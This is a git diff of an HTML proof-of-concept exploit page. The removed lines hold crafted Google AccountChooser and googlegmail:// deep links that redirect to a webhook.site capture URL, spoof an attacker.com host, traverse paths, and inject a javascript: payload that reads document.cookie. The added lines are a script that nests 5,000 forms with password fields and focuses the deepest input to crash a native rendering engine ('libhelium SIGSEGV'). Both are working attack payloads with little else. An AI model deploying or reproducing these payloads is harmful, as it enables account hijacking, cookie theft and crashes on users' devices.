@@ -1,16 +1,33 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Teams PoC</title>
-    <!-- Include the official Teams JS SDK -->
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>libhelium Native SIGSEGV PoC</title>
 </head>
-<body>
-    <!-- index.html -->
-    <a href="https://accounts.google.com/AccountChooser?continue=googlegmail%3A%2F%2Fx-thread%3A%2F%2Fmobile-webview.gmail.com%2F%3Furl%3Dhttps%253A%252F%252Fwebhook.site%252Ffc53efdf-43dc-49b9-be17-535ddf3cf956">Join Meet (Test 7)</a>
-    <a href="https://accounts.google.com/AccountChooser?continue=googlegmail%3A%2F%2F..%2F..%2Fmobile-webview.gmail.com%2F">Conference Test (Test 2)</a>
-    <a href="https://accounts.google.com/AccountChooser?continue=googlegmail://mobile-webview.gmail.com.attacker.com">Account Confusion Test</a>
-    <a href="googlegmail://x-thread://mobile-webview.gmail.com/v1/index.html?debug=1">Account Confusion Test</a>
-    <a href="googlegmail-x-callback://x-callback-url/meet/join?url=javascript:alert(document.cookie)">Account Confusion Test</a>
-    <a href="https://accounts.google.com/AccountChooser?continue=googlegmail://x-thread://mobile-webview.gmail.com/?url=https://webhook.site/fc53efdf-43dc-49b9-be17-535ddf3cf956">Account Confusion Test</a>
-</body>
+    <body>
+    <div id="root"></div>
+    <script>
+    function triggerMemoryCorruption() {
+        let current = document.getElementById('root');
+        
+        // Generate deep tree to force unbounded native C++ allocation
+        for (let i = 0; i < 5000; i++) {
+            let f = document.createElement('form');
+            let input1 = document.createElement('input');
+            input1.type = "text";
+            let input2 = document.createElement('input');
+            input2.type = "password";
+            f.appendChild(input1);
+            f.appendChild(input2);
+            current.appendChild(f);
+            current = f;
+        }
+        
+        // Trigger unbounded recursive tree walk in native layout engine
+        let deepInput = current.querySelector('input');
+        if(deepInput) deepInput.focus();
+    }
+    setTimeout(triggerMemoryCorruption, 500);
+    </script>
+    </body>
 </html>
